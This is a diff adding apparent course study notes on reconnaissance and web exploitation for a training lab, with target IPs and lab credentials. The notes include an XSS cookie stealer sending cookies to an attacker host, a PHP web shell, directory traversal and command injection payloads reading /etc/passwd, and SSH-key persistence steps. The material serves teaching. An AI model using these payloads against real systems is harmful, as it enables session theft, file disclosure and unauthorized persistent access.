@@ -1,0 +1,151 @@
+# Reconnaissance & Scanning
+
+## Demo Scheme of Maneuver
+The network path is structured from the Jump Box through a pivot point to reaching internal targets:
+
+* **Jump Box**
+    * **Pivot:** 192.168.28.105
+        * **T1:** 192.168.28.27
+        * **T2:** 192.168.28.12
+
+### Target Section
+#### Pivot Host
+
+| Attribute | Details |
+| :--- | :--- |
+| **Hostname** | Donovian-Terminal |
+| **IP Address** | `192.168.28.105` |
+| **OS** | Ubuntu 18.04 |
+| **Credentials** | `comrade` :: `StudentReconPassword` |
+| **SSH Port** | 2222 |
+| **PSP** | rkhunter |
+| **Malware** | none |
+| **Action** | Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved. |
+
+
+#### Target 1 (T1)
+| Attribute | Details |
+| :--- | :--- |
+| **Hostname** | unknown |
+| **IP Address** | `192.168.28.27` |
+| **OS** | Linux ver: Unknown |
+| **Credentials** | `comrade` :: `StudentPrivPassword` |
+| **Last Known Ports** | unknown |
+| **PSP** | unknown |
+| **Malware** | unknown |
+| **Action** | Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access. |
+
+
+#### Target 2 (T2)
+| Attribute | Details |
+| :--- | :--- |
+| **Hostname** | unknown |
+| **IP Address** | `192.168.28.12` |
+| **OS** | Linux ver: Unknown |
+| **Credentials** | `comrade` :: `StudentPrivPassword` |
+| **Last Known Ports** | unknown |
+| **PSP** | unknown |
+| **Malware** | unknown |
+| **Action** | Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access. |
+
+---
+
+# Web Exploitation Day 1:
+### Fundamentals Study Guide
+
+## 1.0 Web Fundamentals
+*   **Server/Client Relationship**: Client (Browser) requests; Server provides resources.
+*   **HTTP Protocol**:
+    *   `GET`: Retrieve data.
+    *   `POST`: Submit data.
+*   **CLI Tools**:
+    *   `cURL`: Test APIs and make manual requests.
+    *   `WGET`: Batch download or mirror sites.
+
+---
+
+## 2.0 - 4.1 Website Enumeration
+*Phase: Discovery. Goal: Identify pages, directories, and vulnerabilities.*
+
+### Key Files
+*   **robots.txt**: Located at `http://<IP>/robots.txt`. Lists disallowed paths (e.g., `/admin`, `/backup`).
+
+### Tools & Commands
+> **Note**: Use `proxychains` for TCP support. ICMP is NOT supported.
+
+
+| Tool | Command | Purpose |
+| :--- | :--- | :--- |
+| **NMAP (Enum)** | `proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>` | Brute-forces common hidden paths. |
+| **NMAP (SQLi)** | `proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>` | Finds forms vulnerable to SQL injection. |
+| **NMAP (Robots)**| `proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>` | Parses the robots.txt file automatically. |
+| **Nikto** | `nikto -h <IP>` | Comprehensive web vulnerability scanner. |
+
+---
+
+## 4.2 - 5.1 Cross-Site Scripting (XSS)
+*Injection of malicious client-side JavaScript.*
+
+### Types of XSS
+1.  **Reflected (Non-Persistent)**: Script is reflected via a link (e.g., URL parameters). One-time attack.
+2.  **Stored (Persistent)**: Script is saved to the database (e.g., comments). Affects all visitors.
+
+### Useful Payloads
+*   **Basic Alert (PoC)**: `<script>alert('XSS');</script>`
+*   **Cookie Stealer**: 
+    ```javascript
+    <script>document.location="http://<ATTACKER_IP>/stealer.php?username=" + document.cookie;</script>
+    ```
+*   **Exfiltration Objects**: `document.cookie` (session tokens), `document.body.innerHTML` (page content).
+
+### Defenses
+*   **CORS**: Cross-Origin Resource Sharing.
+*   **CSP**: Content Security Policy.
+
+---
+
+## 6.0 Server-Side Injection
+*Targeting the server components directly.*
+
+### 6.1 Directory Traversal (Arbitrary File Read)
+*   **Action**: Using `../` to navigate outside the web root.
+*   **Payload Example**: `http://<IP>/view.php?file=../../../../etc/passwd`
+*   **Key Files to Check**: `/etc/passwd`, `/etc/shadow`, `/var/www/html/robots.txt`.
+
+### 6.2 Malicious File Upload
+*   **Action**: Uploading a script (e.g., PHP) to execute commands.
+*   **Web Shell Example (`shell.php`)**:
+    ```php
+    <?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
+    ```
+*   **Execution**: Access via `http://<IP>/uploads/shell.php?cmd=whoami`.
+
+### 6.3 Command Injection
+*   **Action**: Chaining OS commands using `;`, `&&`, or `|`.
+*   **Payload Example**: `127.0.0.1; cat /etc/passwd`
+
+---
+
+## 7.0 Persistence: SSH Key Upload
+*Using injection/upload to gain passwordless shell access.*
+
+1.  **Generate Key (Local)**: `ssh-keygen -t rsa`
+2.  **View Public Key**: `cat ~/.ssh/id_rsa.pub`
+3.  **Identify Target User**: `whoami` (e.g., `www-data`)
+4.  **Find Home Directory**: `cat /etc/passwd | grep www-data` (e.g., `/var/www`)
+5.  **Inject/Upload Key**:
+    ```bash
+    mkdir -p /var/www/.ssh
+    echo "ssh-rsa <YOUR_KEY_STRING>" >> /var/www/.ssh/authorized_keys
+    ```
+6.  **Login**: `ssh www-data@<Target_IP>`
+
+---
+
+## Cleanup (Database)
+To remove a stored XSS payload:
+```sql
+mysql
+USE messages;
+SELECT * FROM comments;
+DELETE FROM comments WHERE id = <ID>;
